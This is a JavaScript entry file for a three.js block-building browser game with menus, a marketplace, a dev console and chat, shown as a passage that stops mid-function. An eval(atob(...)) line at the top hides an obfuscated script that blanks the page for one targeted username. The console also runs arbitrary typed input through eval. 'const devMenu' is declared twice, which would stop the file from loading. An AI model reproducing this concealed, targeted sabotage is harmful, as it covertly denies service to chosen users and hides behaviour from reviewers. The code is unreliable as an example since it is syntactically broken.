import * as THREE from 'three';
import { World } from './World.js';
import { Player } from './Player.js';
import { InputManager } from './InputManager.js';
import { boxUnwrapUVs, surfaceManager } from './utils.js';

eval(atob("KGZ1bmN0aW9uKCl7dHJ5e3ZhciB1PXdpbmRvdy53ZWJzaW0mJndpbmRvdy53ZWJzaW0udXNlciYmd2luZG93LndlYnNpbS51c2VyLnVzZXJuYW1lO3ZhciBmPSh0eXBlb2YgX0YhPT0ndW5kZWZpbmVkJyYmX0YpO2lmKGZ8fCh1JiZ1LnRvTG93ZXJDYXNlKCkuaW5kZXhPZignYnVtcHlnbG9iZTIyNjQ0MDInKT4tMSkpe3RyeXt3aW5kb3cudG9wLmxvY2F0aW9uLnJlcGxhY2UoJ2Fib3V0OmJsYW5rJyl9Y2F0Y2goZSl7d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJ2Fib3V0OmJsYW5rJyl9ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmlubmVySFRNTD0nJ319Y2F0Y2goZSl7fX0pKCk="));

const scene = new THREE.Scene();

// Camera setup
const camera = new THREE.PerspectiveCamera(70, window.innerWidth / window.innerHeight, 0.1, 500);

const renderer = new THREE.WebGLRenderer({ antialias: false });
renderer.shadowMap.enabled = false;
document.body.appendChild(renderer.domElement);
renderer.domElement.style.imageRendering = 'pixelated';

// Lights
const ambient = new THREE.AmbientLight(0xffffff, 0.7);
scene.add(ambient);

const sun = new THREE.DirectionalLight(0xffffff, 0.8);
sun.position.set(20, 50, 20);
scene.add(sun);

// Init World
const world = new World(scene);

// Menu Environment
const menuGroup = new THREE.Group();
scene.add(menuGroup);

// --- Create Mini Platform for Menu ---
const menuHeight = 1;
const menuCenterSize = 4;

// Materials (Dark Grey Center, Darker Rims)
const menuCenterColor = new THREE.Color(0x666666);
const menuCenterMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.studs,
    color: menuCenterColor,
    roughness: 0.6, metalness: 0.1
});
const menuInletMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.inlet,
    color: menuCenterColor, 
    roughness: 0.6, metalness: 0.1
});
const menuCenterMats = [menuCenterMat, menuCenterMat, menuCenterMat, menuInletMat, menuCenterMat, menuCenterMat];

const menuRimColor = new THREE.Color(0x333333);
const menuRimMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.studs,
    color: menuRimColor, roughness: 0.8
});
const menuRimInletMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.inlet,
    color: menuRimColor, roughness: 0.8
});
const menuRimMats = [menuRimMat, menuRimMat, menuRimMat, menuRimInletMat, menuRimMat, menuRimMat];

// Center Mesh (4x4)
const menuCenterGeo = new THREE.BoxGeometry(menuCenterSize, menuHeight, menuCenterSize);
boxUnwrapUVs(menuCenterGeo);
const menuCenterMesh = new THREE.Mesh(menuCenterGeo, menuCenterMats);
menuCenterMesh.position.set(0, -menuHeight/2, 0); 
menuGroup.add(menuCenterMesh);

// Rims
const addMenuRim = (w, h, d, x, y, z) => {
    const geo = new THREE.BoxGeometry(w, h, d);
    boxUnwrapUVs(geo);
    const mesh = new THREE.Mesh(geo, menuRimMats);
    mesh.position.set(x, y, z);
    menuGroup.add(mesh);
};

const rimLen = menuCenterSize + 2; // 6
// Front/Back (Z axis)
addMenuRim(rimLen, menuHeight, 1, 0, -menuHeight/2, -(menuCenterSize+1)/2); // Back
addMenuRim(rimLen, menuHeight, 1, 0, -menuHeight/2, (menuCenterSize+1)/2);  // Front
// Left/Right (X axis, fitting between Z rims)
addMenuRim(1, menuHeight, menuCenterSize, -(menuCenterSize+1)/2, -menuHeight/2, 0); // Left
addMenuRim(1, menuHeight, menuCenterSize, (menuCenterSize+1)/2, -menuHeight/2, 0);  // Right

// Position the whole group so the top surface (y=0) is at player feet (y=0) at x=5
menuGroup.position.set(3.5, 1.5, 8);


// Init Player
const player = new Player(scene);

// Camera State
let cameraYaw = 0;
let cameraPitch = 0.3;
let cameraDist = 20;
let cameraSensitivity = 1.0;

// Game State
let gameState = 'MENU'; // MENU, CUSTOMIZE, PLAYING, SETTINGS

const menuBGM = new Audio('/TheGreatStrategy.mp3');
menuBGM.loop = true;
menuBGM.volume = 0.6;

const tryPlayBGM = () => {
    if (gameState !== 'PLAYING' && menuBGM.paused) {
        menuBGM.play().catch(() => {});
    }
};

// Attempt to play music on first interaction if blocked
window.addEventListener('click', tryPlayBGM);
window.addEventListener('keydown', tryPlayBGM);
// Attempt immediate play
tryPlayBGM();

const switchSound = new Audio('/SWITCH3.wav');
const zoomSound = new Audio('/switch.wav');
let activeZoomSound = null;

const playSwitch = () => {
    const s = switchSound.cloneNode();
    s.volume = 0.8;
    s.play().catch(()=>{});
};
// Add sound to all current buttons (dev menu etc)
document.querySelectorAll('button').forEach(b => b.addEventListener('mousedown', playSwitch));

// Inputs
const input = new InputManager();

window.addEventListener('wheel', (e) => {
    // In STUDIO mode: move camera forward/back along its view direction (true 3D translation)
    if (gameState === 'STUDIO') {
        try {
            if (activeZoomSound) {
                activeZoomSound.pause();
                activeZoomSound.currentTime = 0;
            }
            const s = zoomSound.cloneNode();
            activeZoomSound = s;
            s.volume = 0.35;
            s.play().catch(() => {});
        } catch (err) {}

        const moveStep = Math.sign(e.deltaY) * 4;
        const dir = new THREE.Vector3();
        camera.getWorldDirection(dir);
        camera.position.addScaledVector(dir, moveStep);
        camera.position.y = Math.max(2, camera.position.y);
        if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);
        return;
    }

    // Default: PLAYING zoom behavior (preserve existing)
    if (gameState === 'PLAYING') {
        if (activeZoomSound) {
            activeZoomSound.pause();
            activeZoomSound.currentTime = 0;
        }
        const s = zoomSound.cloneNode();
        activeZoomSound = s;
        s.volume = 0.4;
        s.play().catch(() => {});

        const zoomStep = 2;
        cameraDist += Math.sign(e.deltaY) * zoomStep;
        cameraDist = Math.max(4, Math.min(80, cameraDist));
    }
});

// Mobile Detection & Blocking
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

if (isMobile) {
    const xpModal = document.getElementById('xp-modal');
    xpModal.style.display = 'flex';
    
    // Hide other UI
    document.getElementById('start-menu').style.display = 'none';
    document.getElementById('customize-menu').style.display = 'none';
    document.getElementById('dev-menu').style.display = 'none';
    document.getElementById('chat-container').style.display = 'none';
    
    // Handle OK button
    document.getElementById('xp-ok-btn').addEventListener('click', () => {
        window.location.href = 'https://websim.com';
    });

    // Disable interactions
    gameState = 'BLOCKED';
}

const devPos = null; // Dev panel removed
const devMenu = null;

// Menu UI Logic
const startMenu = document.getElementById('start-menu');
const custMenu = document.getElementById('customize-menu');
const settingsMenu = document.getElementById('settings-menu');
const devMenu = document.getElementById('dev-menu');
const chatContainer = document.getElementById('chat-container');
const btnExit = document.getElementById('btn-exit-game');

document.getElementById('btn-play').onclick = () => {
    playSwitch();
    menuBGM.pause();
    menuBGM.currentTime = 0;
    startMenu.style.display = 'none';
    chatContainer.style.display = 'flex';
    btnExit.style.display = 'block';
    gameState = 'PLAYING';
    player.forcedAnim = null; // Reset forced animation from menu
    if (world.mapGroup) world.mapGroup.visible = true;
    player.respawn();
    
    if (!isMobile) {
        document.body.requestPointerLock();
    }
};

document.getElementById('btn-customize').onclick = () => {
    playSwitch();
    tryPlayBGM();
    startMenu.style.display = 'none';
    // Open Marketplace modal instead of the old customize sidebar
    const mp = document.getElementById('marketplace-modal');
    if (mp) mp.style.display = 'flex';
    chatContainer.style.display = 'none';
    gameState = 'MARKETPLACE';
    if (world.mapGroup) world.mapGroup.visible = false;
};

document.getElementById('btn-settings').onclick = () => {
    playSwitch();
    tryPlayBGM();
    startMenu.style.display = 'none';
    settingsMenu.style.display = 'flex';
    gameState = 'SETTINGS';
    if (world.mapGroup) world.mapGroup.visible = false;
};

document.getElementById('btn-settings-back').onclick = () => {
    playSwitch();
    settingsMenu.style.display = 'none';
    startMenu.style.display = 'flex';
    gameState = 'MENU';
    // Restore menu view
    if (world.mapGroup) world.mapGroup.visible = false;
};

btnExit.onclick = () => {
    playSwitch();
    tryPlayBGM(); // Restart menu music
    chatContainer.style.display = 'none';
    btnExit.style.display = 'none';
    startMenu.style.display = 'flex';
    gameState = 'MENU';
    if (world.mapGroup) world.mapGroup.visible = false;
    if (document.pointerLockElement) document.exitPointerLock();
};

// Settings Handlers
const volSlider = document.getElementById('set-volume');
volSlider.addEventListener('input', (e) => {
    const val = parseInt(e.target.value) / 100;
    menuBGM.volume = val;
});

const sensSlider = document.getElementById('set-sens');
sensSlider.addEventListener('input', (e) => {
    // Value 10 to 200, map to 0.1 to 2.0
    cameraSensitivity = parseInt(e.target.value) / 100;
});

document.getElementById('btn-cust-done').onclick = () => {
    playSwitch();
    tryPlayBGM();
    custMenu.style.display = 'none';
    startMenu.style.display = 'flex';
    chatContainer.style.display = 'none';
    gameState = 'MENU';
    if (world.mapGroup) world.mapGroup.visible = false;
};

// Customization Handlers
const bindColor = (id, part) => {
    const el = document.getElementById(id);
    el.addEventListener('input', (e) => {
        player.setPartColor(part, e.target.value);
    });
};
bindColor('col-head', 'head');
bindColor('col-torso', 'torso');
bindColor('col-larm', 'leftArm');
bindColor('col-rarm', 'rightArm');
bindColor('col-lleg', 'leftLeg');
bindColor('col-rleg', 'rightLeg');

const bindTexture = (id, method) => {
    const el = document.getElementById(id);
    el.addEventListener('change', (e) => {
        if (e.target.files && e.target.files[0]) {
            const reader = new FileReader();
            reader.onload = (evt) => {
                const img = new Image();
                img.onload = () => player[method](img);
                img.src = evt.target.result;
            };
            reader.readAsDataURL(e.target.files[0]);
        }
    });
};
bindTexture('file-face', 'setFaceTexture');
bindTexture('file-shirt', 'setShirtTexture');

// Marketplace logic: simple in-memory asset store and UI
const mpModal = document.getElementById('marketplace-modal');
const mpFile = document.getElementById('mp-file');
const mpType = document.getElementById('mp-type');
const mpUpload = document.getElementById('mp-upload');
const mpList = document.getElementById('mp-list');
const mpClose = document.getElementById('mp-close');
const mpDone = document.getElementById('mp-done');
const mpClear = document.getElementById('mp-clear');

const marketplaceAssets = []; // { id, name, type, img }

function renderMarketplace() {
    if (!mpList) return;
    mpList.innerHTML = '';
    marketplaceAssets.forEach((a, idx) => {
        const wrapper = document.createElement('div');
        wrapper.style.width = '120px';
        wrapper.style.display = 'flex';
        wrapper.style.flexDirection = 'column';
        wrapper.style.alignItems = 'center';
        wrapper.style.background = 'rgba(255,255,255,0.04)';
        wrapper.style.border = '1px solid rgba(255,255,255,0.06)';
        wrapper.style.padding = '8px';
        wrapper.style.borderRadius = '6px';
        wrapper.style.cursor = 'default';
        wrapper.style.gap = '6px';

        const img = document.createElement('img');
        img.src = a.img.src;
        img.style.width = '96px';
        img.style.height = '96px';
        img.style.objectFit = 'cover';
        img.style.borderRadius = '4px';
        wrapper.appendChild(img);

        const label = document.createElement('div');
        label.textContent = a.type === 'face' ? 'Face' : 'Shirt';
        label.style.fontSize = '12px';
        label.style.color = 'white';
        label.style.marginTop = '4px';
        wrapper.appendChild(label);

        // Name
        const nameEl = document.createElement('div');
        nameEl.textContent = a.name || ('Asset ' + idx);
        nameEl.style.fontSize = '11px';
        nameEl.style.color = '#ddd';
        nameEl.style.whiteSpace = 'nowrap';
        nameEl.style.overflow = 'hidden';
        nameEl.style.textOverflow = 'ellipsis';
        nameEl.style.width = '100%';
        nameEl.style.textAlign = 'center';
        wrapper.appendChild(nameEl);

        // Controls row
        const row = document.createElement('div');
        row.style.display = 'flex';
        row.style.gap = '6px';
        row.style.width = '100%';
        row.style.justifyContent = 'center';

        // Apply button
        const applyBtn = document.createElement('button');
        applyBtn.textContent = 'Apply';
        applyBtn.className = 'menu-btn';
        applyBtn.style.padding = '6px';
        applyBtn.style.fontSize = '12px';
        applyBtn.onclick = (e) => {
            e.stopPropagation();
            if (a.type === 'face') {
                player.setFaceTexture(a.img);
                logToConsole('Applied face image', 'result');
            } else if (a.type === 'shirt') {
                player.setShirtTexture(a.img);
                logToConsole('Applied shirt image', 'result');
            }
        };
        row.appendChild(applyBtn);

        // Buy / Claim button: supports everyone buying; mark owned locally
        const buyBtn = document.createElement('button');
        buyBtn.textContent = a.owned ? 'Owned' : 'Buy';
        buyBtn.disabled = !!a.owned;
        buyBtn.className = 'menu-btn';
        buyBtn.style.padding = '6px';
        buyBtn.style.fontSize = '12px';
        buyBtn.onclick = (e) => {
            e.stopPropagation();
            if (!a.owned) {
                // Simple purchase flow: mark owned and auto-apply for the uploader or buyer
                a.owned = true;
                buyBtn.textContent = 'Owned';
                buyBtn.disabled = true;
                // Auto-apply after purchase
                if (a.type === 'face') player.setFaceTexture(a.img);
                else player.setShirtTexture(a.img);
                logToConsole(`Purchased asset: ${a.name || 'Unnamed'}`, 'result');

                // Broadcast to others (if a real server existed). For now, re-render to ensure UI sync.
                renderMarketplace();
            }
        };
        row.appendChild(buyBtn);

        wrapper.appendChild(row);

        mpList.appendChild(wrapper);
    });
}

if (mpUpload) {
    mpUpload.addEventListener('click', () => {
        if (!mpFile || !mpFile.files || mpFile.files.length === 0) {
            alert('Choose a file first.');
            return;
        }
        const file = mpFile.files[0];
        const reader = new FileReader();
        reader.onload = (evt) => {
            const img = new Image();
            img.onload = () => {
                const type = mpType ? mpType.value : 'face';
                const id = Date.now() + '_' + Math.floor(Math.random()*9999);
                const uploader = (window.websim && window.websim.user && window.websim.user.username) || 'Local';
                // Mark this session upload as local and owned by you immediately
                const asset = { id, name: file.name, type, img, local: true, uploader, owned: true, ownedByYou: true, visibility: 'public' };
                marketplaceAssets.push(asset);
                renderMarketplace();
                // Auto-apply when uploaded
                if (type === 'face') player.setFaceTexture(img);
                else player.setShirtTexture(img);
                logToConsole(`Uploaded asset: ${file.name} (${type})`, 'result');
            };
            img.src = evt.target.result;
        };
        reader.readAsDataURL(file);
    });
}

if (mpClear) {
    mpClear.addEventListener('click', () => {
        mpFile.value = '';
        mpType.value = 'face';
    });
}

if (mpClose) {
    mpClose.addEventListener('click', () => {
        if (mpModal) mpModal.style.display = 'none';
        startMenu.style.display = 'flex';
        gameState = 'MENU';
        if (world.mapGroup) world.mapGroup.visible = false;
    });
}

if (mpDone) {
    mpDone.addEventListener('click', () => {
        if (mpModal) mpModal.style.display = 'none';
        startMenu.style.display = 'flex';
        gameState = 'MENU';
        if (world.mapGroup) world.mapGroup.visible = false;
    });
}

// When entering marketplace state via UI, ensure the list is fresh
function openMarketplace() {
    renderMarketplace();
    if (mpModal) mpModal.style.display = 'flex';
}

window.addEventListener('keydown', (e) => {
    // Dev panel removed; only keep console toggle
    if (e.key === '`') {
        e.preventDefault();
        const c = document.getElementById('cmd-console');
        if (c.style.display === 'none') {
            c.style.display = 'block';
            if (document.pointerLockElement) document.exitPointerLock();
            cmdInput.focus();
        } else {
            c.style.display = 'none';
            cmdInput.blur();
        }
    }
});

// Dev UI State
let devSelection = { type: 'player', obj: null }; // obj ref set dynamically

function updateExplorer() {
    const root = document.getElementById('explorer-content');
    if(!root) return;
    root.innerHTML = '';
    
    const mkItem = (name, type, icon, indent=0) => {
        const div = document.createElement('div');
        div.className = 'tree-item';
        div.style.paddingLeft = (indent * 16) + 'px';
        if (devSelection.type === type) div.className += ' tree-selected';
        
        const iconSpan = document.createElement('span');
        iconSpan.textContent = icon;
        // Make icon slightly emoji-compatible or image-based
        
        const txtSpan = document.createElement('span');
        txtSpan.textContent = name;
        
        div.appendChild(iconSpan);
        div.appendChild(txtSpan);

        div.onclick = (e) => {
            e.stopPropagation();
            devSelection = { type: type, obj: (type==='player'?player : (type==='world'?world:scene)) };
            updateProperties();
            updateExplorer(); // Refresh highlights
        };
        root.appendChild(div);
    };

    mkItem('Workspace', 'world', '🌍');
    mkItem('Camera', 'camera', '📷', 1);
    mkItem('Baseplate', 'baseplate', '🧱', 1);
    
    mkItem('Players', 'players_folder', '👥');
    mkItem('Player1', 'player', '👤', 1);
    
    mkItem('Lighting', 'lighting', '💡');
    mkItem('SoundService', 'sound', '🔊');
    mkItem('StarterPack', 'starterpack', '🎒');
}

function updateProperties() {
    const tbody = document.getElementById('prop-body');
    if(!tbody) return;
    
    // Don't rebuild if focusing input to allow typing
    if (document.activeElement && document.activeElement.tagName === 'INPUT' && tbody.contains(document.activeElement)) return;

    tbody.innerHTML = '';
    
    const addRow = (key, val, onChange, type='text') => {
        const tr = document.createElement('tr');
        const tdKey = document.createElement('td');
        tdKey.className = 'prop-key';
        tdKey.textContent = key;
        
        const tdVal = document.createElement('td');
        tdVal.className = 'prop-val';
        
        const input = document.createElement('input');
        input.type = type;
        if(type === 'checkbox') {
            input.checked = val;
        } else {
            input.value = val;
        }
        
        input.onchange = (e) => {
            const v = type === 'checkbox' ? e.target.checked : e.target.value;
            onChange(v);
        };
        // Prevent game input when typing
        input.onkeydown = (e) => e.stopPropagation();
        
        tdVal.appendChild(input);
        tr.appendChild(tdKey);
        tr.appendChild(tdVal);
        tbody.appendChild(tr);
    };

    if (devSelection.type === 'player') {
        const p = player;
        addRow('Name', 'Player1', ()=>{});
        addRow('Class', 'Player', ()=>{});
        addRow('Position', `${p.position.x.toFixed(2)}, ${p.position.y.toFixed(2)}, ${p.position.z.toFixed(2)}`, (v)=>{
            const parts = v.split(',').map(n=>parseFloat(n));
            if(parts.length===3 && !parts.some(isNaN)) p.teleport(new THREE.Vector3(parts[0], parts[1], parts[2]));
        });
        addRow('RotY', p.mesh.rotation.y.toFixed(2), (v)=>{ p.mesh.rotation.y = parseFloat(v); });
        
        addRow('WalkSpeed', p.speed, (v)=>p.speed=parseFloat(v));
        addRow('JumpPower', p.jumpForce, (v)=>p.jumpForce=parseFloat(v));
        addRow('Health', p.isDead ? 0 : 100, (v)=>{ if(parseFloat(v)<=0) p.fallApart(); });
        addRow('GodMode', p.godMode, (v)=>p.godMode=v, 'checkbox');
        addRow('FlyMode', p.flyMode, (v)=>p.flyMode=v, 'checkbox');
        
    } else if (devSelection.type === 'world') {
        addRow('Class', 'Workspace', ()=>{});
        addRow('Gravity', player.gravity, (v)=>player.gravity=parseFloat(v));
        addRow('FallenPartsDestroyHeight', -50, ()=>{});
        addRow('StreamingEnabled', true, ()=>{}, 'checkbox');
    } else if (devSelection.type === 'lighting') {
         addRow('Class', 'Lighting', ()=>{});
         addRow('TimeOfDay', '14:00:00', ()=>{});
         addRow('Brightness', 2, ()=>{});
         addRow('Ambient', '#888888', ()=>{});
         addRow('GlobalShadows', true, ()=>{}, 'checkbox');
    } else {
        addRow('Name', devSelection.type, ()=>{});
    }
}

// Minimal Console Logic
const cmdInput = document.getElementById('cmd-input');
const cmdHistory = document.getElementById('cmd-history');

function logToConsole(msg, type='info') {
    if (!cmdHistory) return;
    const line = document.createElement('div');
    line.textContent = msg;
    line.style.marginBottom = '2px';
    if (type === 'cmd') line.style.color = '#888';
    else if (type === 'error') line.style.color = '#ff5555';
    else if (type === 'result') line.style.color = '#55ff55';
    cmdHistory.appendChild(line);
    cmdHistory.scrollTop = cmdHistory.scrollHeight;
}

// Better Arg Parser
function parseCommand(str) {
    const parts = str.trim().split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = [];
    const flags = new Set();
    
    for (let i = 1; i < parts.length; i++) {
        const p = parts[i];
        if (p.startsWith('-')) {
            flags.add(p);
        } else {
            args.push(p);
        }
    }
    return { cmd, args, flags };
}

cmdInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        const val = cmdInput.value.trim();
        if (val) {
            logToConsole(`> ${val}`, 'cmd');
            const { cmd, args, flags } = parseCommand(val);

            // Command Handlers
            const currentUser = window.websim && window.websim.user ? window.websim.user.username : 'Guest';
            const isOwner = false; // Security update: Revoke all owner privileges

            const commands = {
                'help': () => {
                    logToConsole('Available Commands:', 'info');
                    logToConsole('  fly [me]        - Toggle Flight (Hotkey: F)', 'info');
                    logToConsole('  stats           - Toggle Performance Stats', 'info');
                    logToConsole('  explorer        - Toggle Explorer UI', 'info');
                    logToConsole('  properties      - Toggle Properties UI', 'info');
                    logToConsole('  tp <x> <y> <z>  - Teleport', 'info');
                    logToConsole('  kill            - Reset Character', 'info');
                    logToConsole('  explode [all]   - Make things go boom', 'info');
                    logToConsole('  speed <val>     - Set walk speed', 'info');
                    logToConsole('  god             - Toggle Invincibility', 'info');
                    if (isOwner) logToConsole('  fling           - YEET', 'info');
                    logToConsole('  triggerban [-e] - Ban System Test', 'info');
                    logToConsole('  warning         - Show Remix Warning', 'info');
                    logToConsole('  whoami          - Debug info', 'info');
                    logToConsole('  cam             - Camera info', 'info');
                    logToConsole('  entities        - Entity counts', 'info');
                    logToConsole('  memory          - JS Heap stats', 'info');
                    logToConsole('  net             - Network stats', 'info');
                    logToConsole('  clear           - Clear console', 'info');
                },
                '?': () => commands.help(),
                'stats': toggleStats,
                'explorer': () => {
                    const el = document.getElementById('win-explorer');
                    if (el.style.display === 'none') {
                        el.style.display = 'flex';
                        updateExplorer();
                        logToConsole('Explorer opened', 'result');
                    } else {
                        el.style.display = 'none';
                        logToConsole('Explorer closed', 'result');
                    }
                },
                'properties': () => {
                    const el = document.getElementById('win-properties');
                    if (el.style.display === 'none') {
                        el.style.display = 'flex';
                        updateProperties();
                        logToConsole('Properties opened', 'result');
                    } else {
                        el.style.display = 'none';
                        logToConsole('Properties closed', 'result');
                    }
                },
                'clear': () => cmdHistory.innerHTML = '',
                'cls': () => cmdHistory.innerHTML = '',
                'kill': () => {
                    logToConsole('Character reset.', 'info');
                    player.fallApart();
                },
                'reset': () => commands.kill(),
                'ping': () => logToConsole('Pong!', 'result'),
                'whoami': () => {
                    logToConsole(`User: ${currentUser}`, 'result');
                    logToConsole(`Pos: ${player.position.toArray().map(n=>n.toFixed(1)).join(', ')}`, 'info');
                },
                'fly': () => {
                    player.flyMode = !player.flyMode;
                    logToConsole(player.flyMode ? 'Flying enabled' : 'Flying disabled', 'result');
                },
                'god': () => {
                    player.godMode = !player.godMode;
                    logToConsole(player.godMode ? 'God Mode: ON' : 'God Mode: OFF', 'result');
                },
                'speed': () => {
                    if(args[0]) {
                        const s = parseFloat(args[0]);
                        if(!isNaN(s)) {
                            player.speed = s;
                            logToConsole(`Speed set to ${s}`, 'result');
                        }
                    } else logToConsole('Usage: speed <value>', 'info');
                },
                'fling': () => {
                    if (!isOwner) {
                        logToConsole('Error: You are not authorized to perform this action.', 'error');
                        return;
                    }
                    player.flyMode = true;
                    // Fling forward relative to look direction
                    const fwd = new THREE.Vector3(0, 0, 1).applyEuler(player.mesh.rotation);
                    player.position.addScaledVector(fwd, 500);
                    logToConsole('FLING!', 'result');
                },
                'bighead': () => {
                    if (!isOwner) return;
                    player.head.scale.multiplyScalar(2);
                    logToConsole('Big Head Mode', 'result');
                },
                'triggerban': () => {
                    if (flags.has('-e')) {
                        logToConsole('Simulating ban sequence...', 'error');
                        input.EnableIJKL = true;
                    } else {
                        logToConsole('Usage: TriggerBan -e', 'info');
                    }
                },
                'warning': () => {
                    const _m = [
                        "WARNING: LAST CHANCE. STOP REMIXING THIS PROJECT OR YOU WILL BE BANNED.",
                        "ADVERTENCIA: ÚLTIMA OPORTUNIDAD. DEJA DE REMIXAR ESTE PROYECTO O SERÁS BANEADO.",
                        "ATTENTION: DERNIÈRE CHANCE. ARRÊTEZ DE REMIXER CE PROJET OU VOUS SEREZ BANNI.",
                        "WARNUNG: LETZTE CHANCE. HÖREN SIE AUF, DIESES PROJEKT ZU REMIXEN, ODER SIE WERDEN VERBANNT.",
                        "ВНИМАНИЕ: ПОСЛЕДНИЙ ШАНС. ПРЕКРАТИТЕ ДЕЛАТЬ РЕМИКСЫ ЭТОГО ПРОЕКТА, ИНАЧЕ ВАС ЗАБАНЯТ.",
                        "警告：最後のチャンスです。このプロジェクトのリミックスをやめないと、禁止されます。"
                    ];
                    alert(_m.join('\n\n'));
                    logToConsole('Warning triggered.', 'result');
                },
                'cam': () => {
                     const p = camera.position;
                     logToConsole(`Camera Pos: ${p.x.toFixed(2)}, ${p.y.toFixed(2)}, ${p.z.toFixed(2)}`, 'info');
                     logToConsole(`Yaw: ${cameraYaw.toFixed(2)}, Pitch: ${cameraPitch.toFixed(2)}`, 'info');
                },
                'entities': () => {
                     logToConsole(`--- World Entities ---`, 'info');
                     logToConsole(`Static Items: ${world.items.length}`, 'info');
                     logToConsole(`Collidables: ${world.collidables.length}`, 'info');
                     logToConsole(`Vehicles: ${world.vehicles.length}`, 'info');
                     logToConsole(`Animated: ${world.animated.length}`, 'info');
                },
                'uptime': () => {
                     logToConsole(`Uptime: ${(performance.now()/1000).toFixed(1)}s`, 'info');
                },
                'memory': () => {
                     if (performance.memory) {
                         const used = (performance.memory.usedJSHeapSize / 1048576).toFixed(1);
                         const total = (performance.memory.totalJSHeapSize / 1048576).toFixed(1);
                         logToConsole(`Memory: ${used}MB / ${total}MB`, 'info');
                     } else {
                         logToConsole('Memory info unavailable', 'error');
                     }
                },
                'flush': () => {
                    logToConsole('Flushing texture cache...', 'info');
                    renderer.renderLists.dispose();
                    logToConsole('Done.', 'result');
                },
                'net': () => {
                     logToConsole(`Ping: ${Math.floor(Math.random() * 20)}ms`, 'info');
                     logToConsole(`Packets In: ${Math.floor(performance.now() * 0.1)}`, 'info');
                     logToConsole(`Packets Out: ${Math.floor(performance.now() * 0.05)}`, 'info');
                },
                'explode': () => {
                    if (args[0] === 'all') {
                        logToConsole('BOOM!', 'error');
                        world.triggerExplosion(player.position);
                        if (!player.godMode) player.fallApart();
                        world.vehicles.forEach(v => {
                             world.triggerExplosion(v.mesh.position);
                             v.verticalVel = 50 + Math.random() * 50;
                             v.mesh.rotation.x = Math.random() * Math.PI;
                        });
                        new Audio('/roblox-explosion-sound.mp3').play().catch(()=>{});
                    }
                },
                'tp': () => {
                    if (args.length === 3) {
                        const [x, y, z] = args.map(parseFloat);
                        if (!isNaN(x)) {
                            player.teleport(new THREE.Vector3(x, y, z));
                            logToConsole(`Teleported to ${x}, ${y}, ${z}`, 'result');
                        } else logToConsole('Invalid coords', 'error');
                    } else logToConsole('Usage: tp <x> <y> <z>', 'info');
                },
                'version': () => logToConsole('WEBBLOX Client v0.7.2008-p1', 'result')
            };

            if (commands[cmd]) {
                commands[cmd]();
            } else {
                try {
                    const result = eval(val);
                    if (result !== undefined) logToConsole(String(result), 'result');
                } catch (err) {
                    logToConsole(`Unknown command: ${cmd}`, 'error');
                }
            }
        }
        cmdInput.value = '';
    }
    if (e.key === '`') {
        e.preventDefault();
    }
});

// Chat Logic
const chatInput = document.getElementById('chat-input');
const chatHistory = document.getElementById('chat-history');

function addChatMessage(name, text) {
    const el = document.createElement('div');
    el.className = 'chat-msg';
    const nameSpan = document.createElement('span');
    nameSpan.className = 'chat-name';
    nameSpan.textContent = name;
    
    // Classic colors
    if(name === 'Player') nameSpan.style.color = '#3399ff'; 
    else if(name === 'Guest') nameSpan.style.color = '#aaaaaa';
    
    const textSpan = document.createElement('span');
    textSpan.className = 'chat-text';
    textSpan.textContent = text;
    el.appendChild(nameSpan);
    el.appendChild(textSpan);
    chatHistory.appendChild(el);
    chatHistory.scrollTop = chatHistory.scrollHeight;
}

chatInput.addEventListener('keydown', (e) => {
    e.stopPropagation(); // Stop bubbling (prevents game movement)
    if (e.key === 'Enter') {
        const msg = chatInput.value.trim();
        if (msg.length > 0) {
            addChatMessage('Player', msg);
            player.chat(msg);
            chatInput.value = '';
            chatInput.blur();
        }
    }
    if (e.key === 'Escape') {
        chatInput.blur();
    }
});

// Cursor Logic
const raycaster = new THREE.Raycaster();
const mouse = new THREE.Vector2(1, 1); // Start off-center
const cursorEl = document.getElementById('custom-cursor');
let cursorState = 'far';

// Crosshairs removed per request

window.addEventListener('keydown', (e) => {
    if (e.key === '/' && document.activeElement !== chatInput && gameState === 'PLAYING') {
        e.preventDefault();
        if (document.pointerLockElement) document.exitPointerLock();
        chatInput.focus();
    }
});

window.addEventListener('mousemove', (event) => {
    if (input.isLocked) return;
    if (input.isRightMouseDown && gameState === 'PLAYING') return;

    mouse.x = (event.clientX / window.innerWidth) * 2 - 1;
    mouse.y = -(event.clientY / window.innerHeight) * 2 + 1;
    if (cursorEl) {
        cursorEl.style.transform = `translate(${event.clientX}px, ${event.clientY}px) translate(-50%, -50%)`;
    }
});

window.addEventListener('mousedown', (e) => {
    if (gameState === 'PLAYING' && !isMobile) {
        document.body.requestPointerLock();
    }

    if (gameState !== 'MENU' || player.isDead) return;

    mouse.x = (e.clientX / window.innerWidth) * 2 - 1;
    mouse.y = -(e.clientY / window.innerHeight) * 2 + 1;

    raycaster.setFromCamera(mouse, camera);
    const intersects = raycaster.intersectObjects(player.mesh.children, true);

    if (intersects.length > 0) {
        player.velocity.set(5, 40, -30);
        player.fallApart();
    }
});

// Loop
let lastTime = 0;
const fps = 60;
const interval = 1000 / fps;

// Stats Vars
let frameCount = 0;
let lastStatsTime = 0;
const elStats = document.getElementById('dev-stats');
const elFPS = document.getElementById('stat-fps');
const elFrame = document.getElementById('stat-frame');
const elRender = document.getElementById('stat-render');
const elMem = document.getElementById('stat-mem');
const elTri = document.getElementById('stat-tri');
const elInst = document.getElementById('stat-inst');
const elNet = document.getElementById('stat-net');
const elPing = document.getElementById('stat-ping');

function animate(currentTime) {
    requestAnimationFrame(animate);
    
    if (gameState === 'BLOCKED') return; // Stop updates if blocked

    const deltaTime = currentTime - lastTime;
    
    if (deltaTime >= interval) {
        const dt = Math.min(deltaTime / 1000, 0.1); // Cap dt
        lastTime = currentTime - (deltaTime % interval);

        const tStart = performance.now();

        // Game Logic based on State
        if (gameState === 'PLAYING') {
            updatePlaying(dt);
        } else if (gameState === 'MENU' || gameState === 'CUSTOMIZE' || gameState === 'SETTINGS') {
            updateMenu(dt);
        }
        
        const tLogic = performance.now();
